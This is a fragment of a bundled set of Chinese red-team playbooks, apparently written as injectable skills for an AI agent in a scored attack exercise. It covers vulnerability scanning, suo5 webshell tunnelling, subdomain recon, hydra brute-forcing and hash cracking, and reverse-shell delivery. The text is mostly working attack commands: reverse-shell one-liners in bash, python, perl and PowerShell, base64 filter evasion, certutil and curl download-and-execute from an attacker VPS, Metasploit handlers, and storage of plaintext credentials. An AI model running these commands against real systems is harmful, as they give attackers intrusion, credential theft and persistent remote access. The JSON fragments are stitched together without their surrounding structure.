**生产系统避开业务高峰**：定时任务、批量任务类模板（如触发同步/重建索引的）先在测试/预发资产上验证。\n\n## 输出与落库（强制）\n\n跑完立刻落库，**不要攒到最后**：\n\n1. 读 `runs/nuclei-*.jsonl`，逐条 `redteam_vuln_add`：\n   - `title`（模板名 + 命中点）、`severity`、`cve`（模板带的 `classification.cve-id`）、`target`（**带端口**）、\n     `evidence`（命中回显/响应特征/matched-at）、`confidence=confirmed`（nuclei 命中即为已确认存在于响应层面）、\n     `gained`（通过它能拿到什么）、`agent=vuln-scan`。\n2. **每条确认漏洞配一条 `redteam_http_evidence_add`**：请求行 + Host + 关键请求头 + 响应摘要（模板的 `curl-command` 字段可直接用）。\n3. 每个关键动作 `redteam_chain_add`：`stage_code=recon` 或 `internet`，\n   `tool` 写**实际命令原文**（例如 `nuclei -l runs/alive-urls.txt -severity critical,high -rl 50 -jsonl -o runs/nuclei-0918.jsonl`），\n   `result` 写回显摘要（例如 `命中 3 条：CVE-2023-xxxx（critical）…`）。\n4. 测完该资产立刻 `redteam_asset_test` 回写：`status`（testing/tested/no_surface/blocked）、`test`（追加式结论）、`surface`（还剩什么可测）。\n5. **只记能得分的面**：与得分无关的信息泄露、版本暴露、CORS/CSRF、SSL 与响应头类问题**最多记一行排除结论**，不深挖、不重复跑。\n\n## 常见坑\n\n| 现象 | 原因 | 处理 |\n| --- | --- | --- |\n| 一条不命中 | 目标不是 HTTP，或模板被 ignore | 加 `-tl` 看实际跑了哪些模板；确认协议 `-t http/` vs `network/` |\n| 大量 `could not resolve` | URL 清单里有死链 | 先用 `pd-httpx` 过滤存活：`pd-httpx -l all.txt -o alive-urls.txt -silent` |\n| 命中一堆 low/info | severity 没限 | 演练加 `-severity critical,high,medium` |\n| 目标被打挂 | 并发过高 / 跑了 dos 模板 | 降 `-rl`/`-c`；确认 ignore 文件没被动过 |\n| 内网目标打不到 | 没走隧道 | 加 `-proxy socks5://127.0.0.1:<suo5端口>`（技能 `suo5-tunnel`） |"

    "text": "# suo5 内网隧道\n\n> **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，\n> 把隧道登记进库（`redteam_tunnel_add` kind=suo5）并用 `redteam_session_check` 验证真的通，\n> 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。\n> 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。\n\n二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）\n\n## 建立隧道\n```bash\nSUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64\n\n# 1) 用 WebShell 作为隧道端点（HTTP 型）\n$SUO5 -t \"https://target.example.com/upload/x.jsp\" -l 127.0.0.1:1080 -m socks5\n\n# 2) 需要认证时\n$SUO5 -t \"https://target.example.com/upload/x.jsp\" -l 127.0.0.1:1080 --auth user:pass\n\n# 3) 只走 HTTP 代理（部分工具只支持 http proxy）\n$SUO5 -t \"https://target.example.com/upload/x.jsp\" -l 127.0.0.1:8081 -m http\n```\n参数速查：`-t` 目标 shell URL、`-l` 本地监听、`-m socks5|http`、`--auth user:pass`、`-r` 重连间隔、`--debug` 看流量。\n\n## 通过隧道做内网操作\n```bash\n# curl 走 socks5\ncurl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I\n\n# nmap 必须用 -sT（全连接）+ proxychains，或直接 --proxies（新版）\nproxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt\n\n# 数据库 / 中间件\nproxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info\nproxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5\n\n# 浏览器/接口测试走隧道\ncurl -s --socks5 127.0.0.1:1080 \"http://10.0.0.8:8080/api/user/1\" -H \"Cookie: JSESSIONID=...\"\n```\n\n## 内网扫描节奏（避免告警）\n- 先 `/24` 存活探测（`nmap -sn` 经隧道或 ICMP），再对存活主机做常见端口。\n- 速率降到 `-T2 --max-rate 50`，避免 IDS 触发。\n- 新发现的资产全部 `redteam_asset_add`（会自动按 /24 建 C 段），并标 `provenance=\"active\"`、`tool=\"suo5+nmap\"`。\n\n## 落库\n- **建好立刻登记（强制）**：`redteam_tunnel_add`（`kind=suo5`、`listen=127.0.0.1:1080`、`entry=<WebShell URL>`、`reach=可达网段`、`command=完整启动命令`），`webshell_id` 指向对应的 WebShell 记录；随后 `redteam_session_check` 实测连通性，确认 status=active 再往下走。\n- 隧道本身写 `redteam_chain_add`（stage=pivot，detail 写隧道端点与本地端口）。\n- 每个内网资产、每次成功登录、每条凭据分别落库（asset/access/credential）。\n- 隧道掉了用 `redteam_tunnel_update` 标 down；不要留一个\"看起来在跑其实不通\"的隧道给后续角色踩空。\n\n## 注意事项\n- 隧道端点文件用完后按需清理，恢复目标原状。\n- 免费公网代理不适合承载隧道；suo5 走的是目标自身的 WebShell，不需要额外代理。\n- 只在授权范围内使用。"

    "text": "## 前置检查\n1. 确认目标 CIDR 在授权范围内。\n2. 确认当前时间窗口允许主动扫描。\n\n## 命令\n- 快速存活：`nmap -sn <cidr>`\n- 全端口（限速）：`nmap -sS -p- --min-rate 1000 -T4 <target> -oX runs/nmap-full.xml`\n- 服务版本：`nmap -sV -sC -p <ports> <target> -oX runs/nmap-svc.xml`\n\n## 本地已备好的工具（绝对路径，优先用它们，不要手搓）\n| 用途 | 命令 |\n| --- | --- |\n| 端口扫描 | `nmap` / `masscan` / `~/.dsh/redteam/toolkit/naabu/naabu`（SYN 需 root，否则加 `-scan-type c`） |\n| 内网综合扫描 | `~/.dsh/redteam/toolkit/fscan/fscan`（技能 fscan-intranet） |\n| 内网测绘/指纹 | `~/.dsh/redteam/toolkit/gogo/gogo`（技能 gogo-intranet） |\n| HTTP 探测（ProjectDiscovery） | `~/.local/bin/pd-httpx`（**注意：`/usr/bin/httpx` 是 Python httpx 库的 CLI，不是这个**） |\n| 子域/解析 | `~/.dsh/redteam/toolkit/subfinder/subfinder`、`~/.dsh/redteam/toolkit/dnsx/dnsx` |\n| POC 扫描 | `nuclei`（模板已在 `~/.local/nuclei-templates`） |\n| 目录爆破 | `ffuf`、`~/.dsh/redteam/toolkit/dirsearch/dirsearch` |\n| 隧道 | `~/.dsh/redteam/toolkit/suo5/suo5-linux-amd64`、`toolkit/chisel/chisel`、`toolkit/frp/{frpc,frps}` |\n| 完整清单 | `~/.dsh/redteam/toolkit/清单.md`、`技能工具清单.md` |\n\n`setup.sh` 不下载 dirsearch。`清单.md` 是说明文件，缺了不代表扫描器没装。Windows 与 ARM 构建也不在安装脚本里。\n\n## 落库要求\nprovenance = `active`，tool = `nmap`/`masscan`，记录 scan_run。"

    "meta": {
      "format": "bundled",
      "description": "ProjectDiscovery 信息收集流水线：subfinder→dnsx→naabu→httpx→katana 一键铺开域名资产面",
      "version": "1.0.0",
      "whenToUse": "信息收集阶段拿到域名/单位名后，系统化铺开子域→解析→端口→存活→页面与接口",
      "source": "dsh-purge 的 recon-pipeline 技能（原文照搬）"
    },
    "chars": 3890,
    "injectable": true,
    "builtin": true,
    "text": "# 外部信息收集流水线（ProjectDiscovery）\n\n把\"一个域名\"变成\"一份带标题、技术栈、端口的存活资产清单\"，是信息收集阶段的标准动作。\n四个工具**有固定顺序**：先枚举子域 → 再解析 → 再探端口 → 再判存活 → 最后抓页面与接口。\n\n## 本机工具\n\n| 工具 | 路径 | 版本 | 作用 |\n| --- | --- | --- | --- |\n| subfinder | `$DSH_HOME/redteam/toolkit/subfinder/subfinder` | v2.16.0 | 被动子域枚举（多源聚合） |\n| dnsx | `$DSH_HOME/redteam/toolkit/dnsx/dnsx` | v1.3.1 | 批量解析、DNS 爆破、泛解析过滤 |\n| naabu | `$DSH_HOME/redteam/toolkit/naabu/naabu` | v2.6.1 | 高速端口扫描（SYN 需 root，否则 `-scan-type c`） |\n| httpx | `$DSH_HOME/redteam/toolkit/httpx/httpx`（包装器 `~/.local/bin/pd-httpx`） | v1.12.0 | HTTP 存活/标题/技术栈/状态码 |\n| katana | ❌ 未安装（如需抓取用技能 `browser-automation`） | — | 爬虫抓页面与接口 |\n| ksubdomain | `$DSH_HOME/redteam/toolkit/ksubdomain/ksubdomain` | v0.7 | 无状态子域爆破（比 dnsx 爆破快） |\n| OneForAll | `$DSH_HOME/redteam/toolkit/oneforall/OneForAll-0.4.5/`（源码，需 `.venv`） | v0.4.5 | 子域收集全家桶（字典大，慢但全） |\n\n> ⚠️ **`/usr/bin/httpx` 是 Python httpx 库的 CLI，不是 ProjectDiscovery 的**——必须用 `pd-httpx` 或绝对路径。\n\n## 标准流水线\n\n```bash\nmkdir -p runs\nTK=$DSH_HOME/redteam/toolkit\nD=example.com\n\n# ① 子域枚举（被动，多源）\n$TK/subfinder/subfinder -d $D -all -silent -o runs/subfinder-$D.txt\n# 补充：无状态爆破（有字典时）\n# $TK/ksubdomain/ksubdomain -d $D -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n\n# ② 泛解析过滤 + 解析存活（dnsx 会剔除泛解析噪声，这一步很关键）\ncat runs/subfinder-$D.txt | $TK/dnsx/dnsx -silent -a -resp -o runs/dnsx-$D.txt\nawk '{print $1}' runs/dnsx-$D.txt | sort -u > runs/alive-domains-$D.txt\n\n# ③ 端口扫描（先 top100 快速过一遍，再对存活主机扫全端口）\n$TK/naabu/naabu -l runs/alive-domains-$D.txt -top-ports 100 -silent -o runs/naabu-$D.txt\n# 全端口（慢，确认在范围内再做）：-p - -rate 1000\n\n# ④ HTTP 存活与指纹（标题/状态码/技术栈/服务器）\n$TK/httpx/httpx -l runs/alive-domains-$D.txt -ports 80,443,8080,8443,8000,8888,9000 \\\n  -title -status-code -tech-detect -web-server -follow-redirects -silent \\\n  -json -o runs/httpx-$D.jsonl\n\n# ⑤ 整理成资产清单（URL 清单给目录爆破/漏洞扫描用）\npython3 - <<'PY'\nimport json\nout=set()\nfor line in open('runs/httpx-'+'$D'+'.jsonl'):\n    try: j=json.loads(line)\n    except: continue\n    if j.get('url'): out.add(j['url'])\nopen('runs/alive-urls.txt','w').write('\\n'.join(sorted(out)))\nprint('存活 URL:', len(out))\nPY\n```\n\n## 单条命令速查（不想跑全流程时）\n\n```bash\n# 只要子域\n$TK/subfinder/subfinder -d example.com -all -silent\n\n# 只要存活 URL（已有域名清单）\npd-httpx -l domains.txt -silent -o alive.txt\n\n# 只要端口（单 IP，全端口）\nnmap -sS -p- --min-rate 1000 -T4 1.2.3.4 -oX runs/nmap-1.2.3.4.xml   # 技能 active-scan\n$TK/naabu/naabu -host 1.2.3.4 -p - -rate 1000 -silent\n```\n\n## 与其它技能的分工\n\n| 场景 | 用哪个 |\n| --- | --- |\n| 单位名/域名 → 互联网资产面（含未备案、同主体） | **`fofa-recon`**（测绘，找得最全） |\n| 域名 → 子域 → 存活 → 指纹 | **本技能**（流水线，标准化） |\n| 不接触目标（纯被动） | `passive-recon`（crt.sh/dig/whois） |\n| 内网大网段测绘 | `gogo-intranet`（**不要用本技能打内网**） |\n| SP​A/JS 渲染页面、接口清单 | `browser-automation` / `kimi-webbridge` |\n| 存活主机端口/服务版本 | `active-scan`（nmap/masscan） |\n\n**推荐顺序**：`fofa-recon` 铺面（拿单位资产全景）→ 本技能对每个域名做流水线（拿存活与指纹）→ `active-scan` 对重点 IP 定版本。\n\n## 纪律\n\n1. **只测授权范围内目标**：naabu 全端口、ksubdomain 爆破都属于**主动**行为，确认在范围内再做。\n2. **限速**：`naabu -rate 1000` 起步；`subfinder` 用被动源不加 `-all` 时更安静（配额消耗也少）。\n3. **泛解析**：`dnsx` 会过滤；如果结果里出现大量同 IP 的随机子域，说明目标有泛解析，改用 `-wd` 或换爆破字典。\n4. **API key（可选增强）**：`subfinder` 配置 `~/.config/subfinder/provider-config.yaml` 可接\n   Shodan/Censys/VirusTotal 等源（**需要用户提供 key**，见技能 `redteam-setup`）；没 key 也能用免费源。\n\n## 输出与落库（强制）\n\n1. **逐条 `redteam_asset_add`**：`target`（域名/IP）、`names`（域名）、`ports`（带 `url=host`、`title`、`product=server`）、\n   `provenance=passive`（subfinder/dnsx 阶段）或 `active`（naabu/httpx 主动探测）、`tool`（具体工具名）。\n2. **按 /24 自动建 C 段**（`redteam_asset_add` 已自动处理）→ 用 `redteam_asset_link` 建立\n   `resolves`（域名→IP）、`contains`（C 段→IP）关系，形成图谱（技能 `asset-correlation`）。\n3. 每个阶段 `redteam_chain_add`：`stage_code=recon`，`tool` 写实际命令原文，`result` 写数量摘要\n   （如 `subfinder 命中 42 个子域 → dnsx 存活 31 → naabu 开放 87 端口 → httpx 存活 19 个站点`）。\n4. **重点标注边缘资产**：测试/预发环境（test/dev/uat/pre/staging）、老旧系统、非标准端口、\n   非备案主体但同 C 段/IP 的站点——写进 `note`，这些是资产梳理阶段的高优先级目标。\n5. 结论给指挥者时**给数字**：子域数 / 存活 IP 数 / 开放端口数 / 存活站点数 / 其中高优先级几条。"
  },

      "version": "1.0.0",
      "whenToUse": "发现登录入口（Web 后台/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis）需要试口令；或已拿到哈希/密文需要还原明文",
      "source": "dsh-purge 的 credential-attack 技能（原文照搬）"

    "chars": 5338,
    "injectable": true,
    "builtin": true,
    "text": "# 凭据攻击（在线爆破 + 离线破解）\n\n红队里\"拿账号权限\"最稳的两条路之一（另一条是配置/源码泄露拿到明文）。\n**本技能只管把口令试出来**；试出来之后必须用技能 `browser-automation` / `kimi-webbridge`\n**在真实浏览器登录一次**才算拿到账号权限（红线：只有凭据不算拿到账号）。\n\n## 本机工具\n\n| 工具 | 路径 | 版本 | 用途 |\n| --- | --- | --- | --- |\n| **hydra** | `/usr/bin/hydra` | 9.7 | 在线爆破，覆盖 50+ 协议 |\n| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 离线哈希破解（GPU/CPU） |\n| **john** | `/usr/sbin/john` | — | 离线破解（自动识别格式，配置简单） |\n\n字典：`/usr/share/wordlists/`（含 `rockyou.txt` 需 gunzip）、`/usr/share/seclists/Passwords/`。\n**没有 rockyou 时先解压**：`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`（需授权，没有就换 seclists 里的）。\n\n## 一、在线爆破（hydra）\n\n### 通用语法\n```bash\nhydra -L users.txt -P pass.txt <protocol>://<target>[:port] [模块参数] -t <并发> -f -o runs/hydra-<target>.txt\n```\n- `-L` 用户名字典 / `-l` 单个用户名；`-P` 口令字典 / `-p` 单个口令\n- `-t` 并发（**默认 16，别超过 16**，多数服务会锁号或封 IP）\n- `-f` 命中一个就停（避免把账号打锁）\n- `-o` 输出到 `runs/`（报告要靠它复现）\n- `-V` 显示每次尝试（调试用，正式跑别开）\n\n### 各协议实例\n```bash\n# SSH\nhydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt\n\n# RDP（注意：并发必须低，Windows 会锁号）\nhydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt\n\n# SMB\nhydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f\n\n# FTP\nhydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f\n\n# MySQL\nhydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f\n\n# MSSQL\nhydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f\n\n# Web 表单登录（POST）——最常用\nhydra -L users.txt -P pass.txt target.example.com http-post-form \\\n  \"/admin/login.jsp:username=^USER^&password=^PASS^:F=用户名或密码错误\" -t 8 -f -o runs/hydra-web-admin.txt\n\n# Web 表单（带额外头/HTTPS）\nhydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \\\n  \"/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx\" -t 8 -f\n```\n\n### Web 表单爆破的成败判定（关键）\n`http-post-form` 第三段格式：`\"<路径>:<POST 体>:<失败条件>\"`，**失败条件必须写准**，否则全量误报：\n- `F=<失败特征串>`：响应里出现该串表示**失败**（推荐，最稳）\n- `S=<成功特征串>`：响应里出现该串表示**成功**（响应无统一失败文案时用）\n- 先手工发两次请求（错误口令 vs 正确口令各一次，或对比不存在用户）**确认特征串唯一**，再跑爆破。\n- 有验证码 / 图形码 / 滑块：先看能不能绕过（固定验证码、验证码不校验、前端校验），绕不过**不要硬爆**（技能 `browser-automation` 可做有限次带验证码尝试），转别的路。\n\n### 字典优先级（省时间的关键）\n1. **针对性小字典**（命中率最高）：单位名/品牌/域名/年份组合，如 `单位简称@2026`、`Admin@123`、`<域名>2026`；\n   用 `redteam_asset_query` 里的 title/单位信息现造。\n2. **默认口令字典**：产品默认口令（`admin/admin`、`tomcat/tomcat`、`weblogic/weblogic1`、`sa/sa`），\n   参考 nuclei 模板 `http/default-logins/`（307 个），**先查 `redteam_poc_search`**。\n3. **常见弱口令 TOP**：`/usr/share/seclists/Passwords/Common-Credentials/` 下的 10-million / top-100 等。\n4. 通用大字典（rockyou）放最后——慢且噪声大。\n\n### 用户名从哪来\n- Web 后台：报错信息、JS 里的默认账号、接口返回的 `createBy`、登录页提示、`robots.txt`、员工邮箱前缀；\n- 目录爆破命中 `/admin` 时优先试 `admin`、`administrator`、`system`、`test`、`guest`；\n- 拿到一个凭据后走**凭据复用**（见下），比爆破快得多。\n\n## 二、离线破解（hashcat / john）\n\n拿到哈希/密文（数据库、配置文件、`/etc/shadow`、Web 应用库）后离线跑，**不产生目标侧流量**，比在线爆破安全得多。\n\n```bash\n# 1) 先识别哈希类型\nhashcat --identify hashes.txt\n\n# 2) NTLM（Windows）\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3\n\n# 3) NetNTLMv2（Responder 抓到的）\nhashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# 4) MD5 / SHA1（Web 应用库）\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# 5) bcrypt（WordPress / PHP）\nhashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# 6) 加规则（用规则把字典放大 10 倍，性价比最高）\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# 7) 掩码爆破（已知口令策略，如 8 位数字 + 大写字母）\nhashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'\n```\n\n```bash\n# john：格式识别省事，配置在 ~/.john/john.conf\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt\n```\n\n**注意**：本机可能没有 GPU，`hashcat` 走 CPU 会慢——优先用规则+小字典，或把哈希存到 `runs/` 后续处理；\n**不要为了破解挂几个小时**，破解不出来就用哈希直接打（Pass-the-Hash，见技能 `lateral-movement`）。\n\n## 三、凭据复用（比爆破快得多，优先做）\n\n拿到任何一组凭据后，**先横向试**，不要急着爆下一个：\n1. `redteam_credential_list` 看已有凭据（含用户名/口令/来源）；\n2. 同一口令试：其他同款系统、其他资产的管理端、SSH/RDP/SMB/数据库、VPN/堡垒机/运维平台；\n3. 用户名规律（`姓.名`、工号、邮箱前缀）配合已知口令试同系统其它用户；\n4. 哈希直接复用：PtH / Pass-the-Key（技能 `lateral-movement`）。\n\n## 四、纪律与边界（必须遵守）\n\n1. **先查库**：`redteam_credential_list` / `redteam_asset_query`——别重复爆同一个入口（`blocked_count>0` 的先看原因）。\n2. **锁号风险**：Windows（RDP/SMB）与 OA/域账号**严格限流**：`-t 2`（Windows）、`-t 4`（SSH/FTP）、\n   字典不超过百条量级；**同一账号连续失败 5 次就停**，换账号或换目标——把账号打锁等于毁掉入口。\n3. **同一目标累计被封 >3 次放弃**（`redteam_asset_test` status=abandoned + blocked=true）。\n4. **降噪走代理**：Web 表单爆破用技能 `cn-proxy-pool` 换出口 IP；内网目标走 suo5 隧道。\n5. **内网优先用 fscan**：内网段落的弱口令普查交给技能 `fscan-intranet`（28 类服务批量爆破，一趟出结果），\n   hydra 用于 fscan 没覆盖的协议或需要精细控制的单点。\n\n## 五、输出与落库（强制）\n\n1. **每条命中立刻 `redteam_credential_add`**：\n   - `username`、**明文写 `secret_value`**（面板直接显示，便于随时复用）、`source`（`弱口令`/`默认口令`/`凭据复用`/`泄露`/`离线破解`）、\n     `tool`（实际命令原文，如 `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`）、`secret_ref`（证据文件路径如 `runs/hydra-ssh-10.0.0.5.txt`）。\n2. **必须实测登录才记分**：Web 后台用 `browser-automation` / `kimi-webbridge` 真实登录一次\n   （打开登录页 → 填账号口令 → 确认进入后台 → 记页面标题/菜单/当前用户名 → 抓 Cookie 存证据）→\n   `redteam_access_add`（`method=web-login`）→ `redteam_score_hit`（`web-app` 10 分 / `web-app` 20 分，\n   `evidence` 写「资产｜后台管理员 tomcat/Tomcat@2024」）。\n   **登不进去就在 `redteam_asset_test` 的 `test` 里记一行卡点**（哈希未破解/需二次认证/限制来源 IP/账号已禁用），不记分。\n3. **账号权限按服务封顶**：同一资产同一端口只算一次分，拿到管理员即该服务拿满——不要在同一服务上刷多个账号。\n4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），\n   `tool` 写实际命令、`result` 写回显摘要（如 `ssh 10.0.0.5 用 root/Root@123 登录成功，uid=0(root)`）。\n5. 哈希文件、破解结果一律放 `runs/`。"

    "text": "# 反弹 Shell 与载荷投递（拿到回连会话）\n\n> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，\n> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：\n> ```bash\n> set -a; . \"$DSH_HOME/.env\" 2>/dev/null || . \"$HOME/.dsh/.env\"; set +a\n> VPS_USER=\"${REDTEAM_VPS_USER:-ubuntu}\"; VPS=\"$REDTEAM_VPS_HOST\"\n> ```\n> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。\n\n**命令执行 ≠ 会话**。一次性的 `?cmd=whoami` 只能证明有洞，不能持续操作。本技能负责把\"能执行命令\"\n变成**稳定、可交互、可复用**的回连会话，并投递后续载荷（马、隧道、扫描器）。\n\n## 本机基础设施\n\n| 项 | 值 |\n| --- | --- |\n| VPS | `$REDTEAM_VPS_HOST`（SSH 端口 22，私钥 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） |\n| 载荷分发 | `http://$REDTEAM_VPS_HOST:9100/`（fscan/gogo/冰蝎马/哥斯拉马已同步） |\n| 监听端口段 | `9000-9999` |\n| 会话管理 | `tmux`（监听必须跑在 tmux 里，否则断开即丢） |\n| 本机工具 | `nc`、`socat`、`msfconsole` 6.5.3（`exploit/multi/handler`、`exploit/multi/script/web_delivery` 已验证存在） |\n\n配套技能：`vps-reverse-shell`（VPS 登录与监听的具体操作）、`webshell-toolkit`（落地冰蝎/哥斯拉马）。\n\n## 一、选型：什么时候用哪个\n\n| 场景 | 用法 |\n| --- | --- |\n| **临时验证**（只想跑一条命令看回显） | `nc -lvnp <port>` + 目标侧 bash/python 反弹，够用就走 |\n| **要长期操作 / 传文件 / 开隧道**（**主力**） | **MSF `multi/handler`**（自动重连、可升级 meterpreter、能开 socks） |\n| **目标只能出 HTTP(S)** | `web_delivery`（MSF 生成一行命令，目标主动拉 payload） |\n| **Windows 目标、要稳** | MSF handler + `shell_to_meterpreter` 升级 |\n| **需要把内网流量代理回来** | 拿到 shell 后**不是**用 shell 代理，而是落地 WebShell → `suo5-tunnel`（见技能） |\n\n## 二、MSF handler（推荐主力）\n\n```bash\n# 1) 在 VPS 的 tmux 里起监听（本机/VPS 都行，看回连方向）\ntmux new -s handler\nmsfconsole -q\n\nmsf6 > use exploit/multi/handler\nmsf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows：windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST $REDTEAM_VPS_HOST\nmsf6 > set LPORT 9001\nmsf6 > set ExitOnSession false      # 关键：会话断了不退出，继续等重连\nmsf6 > exploit -j                    # 后台监听\n```\n\n**起监听前先确认端口没被占**：`ss -lntp | grep 9001`；VPS 安全组要放行该端口。\n\n一次性投递 + 收会话的完整链路示例：\n```bash\n# 目标侧（假设有一个命令执行点）\nbash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'\n# 无 bash 时用别的（见下表）\n```\n\n## 三、各语言反弹一句话（按目标环境选）\n\n```bash\n# Linux - bash\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n# Linux - 无 bash（sh + nc）\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f\n# Linux - python3\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\n# Linux - perl\nperl -e 'use Socket;$i=\"<IP>\";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n# Windows - powershell（注意转义与执行策略）\npowershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n# Windows - certutil 下载载荷后执行\ncertutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\\Windows\\Temp\\f.exe && C:\\Windows\\Temp\\f.exe -h 10.0.0.0/24\n# Linux - curl/wget 下载载荷\ncurl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss\n```\n\n**编码绕过**：命令里有空格/引号被拦时，base64 编码后解：\n```bash\n# 生成（本机）\necho -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0\n# 目标执行\necho <BASE64> | base64 -d | bash\n```\n\n## 四、MSF web_delivery（只能出 HTTP 时）\n\n```bash\nmsf6 > use exploit/multi/script/web_delivery\nmsf6 > set target 7              # 7 = Linux Python（先 show targets 看列表）\nmsf6 > set payload python/meterpreter/reverse_tcp\nmsf6 > set LHOST $REDTEAM_VPS_HOST\nmsf6 > set LPORT 9002\nmsf6 > exploit -j\n# MSF 会输出一行命令（形如 python -c \"import urllib.request;...\"），\n# 把它投到目标的命令执行点 → 目标主动拉 payload → 会话建立\n```\n\n## 五、升级与维持\n\n```bash\n# shell 升级为 meterpreter（能开 socks、传文件、提权）\nmsf6 > sessions -l\nmsf6 > sessions -u <id>            # 或者用 post/multi/manage/shell_to_meterpreter\n\n# 通过 meterpreter 开内网 socks 代理\nmeterpreter > run autoroute -s 10.0.0.0/24\nmeterpreter > background\nmsf6 > use auxiliary/server/socks_proxy\nmsf6 > set SRVPORT 1080\nmsf6 > set VERSION 5\nmsf6 > exploit -j\n# 之后 proxychains 指向 127.0.0.1:1080 即可进内网\n```\n> ⚠️ 记分口径：**只有自己 VPS 上的代理不算隧道**。通过 meterpreter autoroute 打到的内网目标属于\n> `entry_kind=target-agent`（经目标已控进程转发），登记 `redteam_tunnel_add` 时必须说清目标侧那一端。\n\n## 六、纪律（必须遵守）\n\n1. **监听必须跑在 tmux 里**：SSH 断线会杀掉监听，会话就丢了。`tmux new -s handler` / `tmux a -t handler`。\n2. **端口先探测占用**，VPS 安全组放行；一台机器同时别开太多监听（9000-9999 段内按序用）。\n3. **反弹 shell 是\"目标主动外连\"**：目标出网受限时先试 HTTP(S) 出网（80/443/8080），\n   完全不出网就只能走 WebShell + 隧道（`suo5-tunnel`）。\n4. **不要在生产系统跑会重启服务的载荷**；提权/内核漏洞类操作先评估重启风险。\n5. **会话要登记**：拿到 shell 立刻 `redteam_session_check` 后面能用；隧道登记见 `redteam_tunnel_add`。\n\n## 七、输出与落库（强制）\n\n1. **拿到回连会话立刻记分**：`redteam_score_hit`（`server-host` / `server-host`），`evidence` 写「资产｜shell 类型与权限」（如 `10.0.0.5｜root shell（uid=0）`）。\n2. **会话落库**：`redteam_access_add`（`method=reverse-shell`，写清 `target`、`user`、`privilege`、监听地址与端口）。\n3. **隧道落库**（若通过它进了内网）：`redteam_tunnel_add`，`entry_kind` 必须说清目标侧那一端\n   （`target-outbound`=目标反弹/目标跑 frp 客户端、`target-http`=经目标 WebShell 的 suo5、`target-agent`=经目标已控进程转发），\n   然后 `redteam_session_check` 实测连通性。\n4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（互联网侧拿权限）/ `boundary`（搭隧道）/ `internal`，\n   `tool` 写**实际命令原文**（含完整反弹命令或 MSF 配置），`result` 写回显摘要（如 `uid=0(root) gid=0(root)`）。\n5. **交付给用户能复用的入口**：优先落地**冰蝎马/哥斯拉马**（技能 `webshell-toolkit`）——用户能在控制台直连操作；\n   临时反弹会话要说明\"这是一次性会话，非交付入口\"。"

